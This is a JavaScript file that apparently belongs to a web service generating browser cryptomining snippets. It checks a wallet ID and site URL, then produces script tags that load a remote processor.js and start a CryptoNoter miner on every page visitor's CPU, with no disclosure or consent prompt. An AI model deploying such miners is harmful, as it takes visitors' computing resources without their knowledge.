function copyToClipboard(val){
    var dummy = document.createElement("input");
    document.body.appendChild(dummy);
    $(dummy).css('display','none');
    dummy.setAttribute("id", "dummy_id");
    document.getElementById("dummy_id").value=val;
    dummy.select();
    document.execCommand("copy");
    document.body.removeChild(dummy);
}

function is_url(str)
{
  regexp =  /^(?:(?:https?|ftp):\/\/)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})))(?::\d{2,5})?(?:\/\S*)?$/;
        if (regexp.test(str))
        {
          return true;
        }
        else
        {
          return false;
        }
}

$('#myform').on('submit', function(ev) {
	$('#myModal').modal('show'); 
	var instructions = "Place the following code within the <code>&lt;head&gt;</code> tags on your webpage<br/><br/>"
	
	var walletid = $("#wallet-id").val();
	var throttle = $("#throttle-val").val();
	var website = $('#website-address').val();
	var outputstring = "";
	var copystring = "";
	var correctinput = true;

	//Check for invalid wallet length
	if(walletid.length != 95){
		outputstring = "<b>Invalid wallet length.</b><br/><br/>"
						+ "Wallet-ID should be a character string similar to the following:<br/><br/>"
						+ "<i>45kuSXfmtSWbxWkgUaFnNVfgbXAVFzK6VTgZhiRcUyE1F3cz<br/>WoAbF3V1TAiwK1qtGK4GP32V9MRxz78yubiHHtt79Fd4GN7</i><br/><br/>";

		correctinput = false;
	}

	//Check for invalid websie address
	if(!is_url(website)){
		outputstring += "<b>Invalid website address.</b><br/><br/>"
						+ "Website address must be a valid URL e.g  <br/><br/>"
						+ "<i>cryptonate.tk</i>";

		correctinput = false
	}
	

	if(correctinput){
		var threadsval = "";
	
		switch(throttle){
			case "100%":
				threadsval = "0.0";
				break;
			case "80%":
				threadsval = "0.2";
				break;
			case "60%":
				threadsval = "0.4";
				break;
			case "40%":
				threadsval = "0.6";
				break;
			case "20%":
				threadsval = "0.8";
				break;
			default:
				threadsval = "0.0";
				break;
		}

		copystring = "<script src =" + "https:" + "/" + "/" + "cryptonate.tk/processor.js></script>";
		
		copystring = copystring + "\n<script>\n" 
			   + "\n var addr = " + walletid + ";"
			   + "\n var miner = new CryptoNoter.User(addr, {"
			   + "\n    autoThreads: true,"
			   + "\n    throttle: " + threadsval
			   + "\n });"
			   + "\n miner.start();"
			   + "\n\n</script>";

		var processor = "<code>&lt;script src=&quothttps://cryptonate.tk/processor.js&quot&gt;&lt;/script&gt;<br/></code>";

		var resultString = processor +"<br/><code>&lt;script&gt;</code><pre><code>&emsp;"
							+ "var addr = " + walletid + ";<br/>&emsp;"
							+ "var miner = new CryptoNoter.User(addr, {<br/>&emsp;&emsp;&emsp;"
							+ "autoThreads: true,<br/>&emsp;&emsp;&emsp;"
							+ "throttle: " + threadsval + "});<br/>&emsp;"
							+ "miner.start();</code></pre>"
							+ "<code>&lt;/script&gt;</code>";
		
		outputstring = instructions + resultString;
	}
	
	
	$(".modal-top").html(instructions); 
	$(".modal-body").html(resultString);
	$('#copy-hidden').html(copystring);
	
	$('#copy-button').on('click', function(evt){

          console.log("Pressed here!");
          //Get the text field
          var copyText = copystring;
          console.log(copyText);

	  copyToClipboard(document.getElementById("copy-hidden"));
        });

	ev.preventDefault();
});

function copyToClipboard(elem) {
	  // create hidden text element, if it doesn't already exist
    var targetId = "_hiddenCopyText_";
    var isInput = elem.tagName === "INPUT" || elem.tagName === "TEXTAREA";
    var origSelectionStart, origSelectionEnd;
    if (isInput) {
        // can just use the original source element for the selection and copy
        target = elem;
        origSelectionStart = elem.selectionStart;
        origSelectionEnd = elem.selectionEnd;
    } else {
        // must use a temporary form element for the selection and copy
        target = document.getElementById(targetId);
        if (!target) {
            var target = document.createElement("textarea");
            target.style.position = "absolute";
            target.style.left = "-9999px";
            target.style.top = "0";
            target.id = targetId;
            document.body.appendChild(target);
        }
        target.textContent = elem.textContent;
    }
    // select the content
    var currentFocus = document.activeElement;
    target.focus();
    target.setSelectionRange(0, target.value.length);
    
    // copy the selection
    var succeed;
    try {
    	  succeed = document.execCommand("copy");
    } catch(e) {
        succeed = false;
    }
    // restore original focus
    if (currentFocus && typeof currentFocus.focus === "function") {
        currentFocus.focus();
    }
    
    if (isInput) {
        // restore prior selection
        elem.setSelectionRange(origSelectionStart, origSelectionEnd);
    } else {
        // clear temporary content
        target.textContent = "";
    }
    return succeed;
}
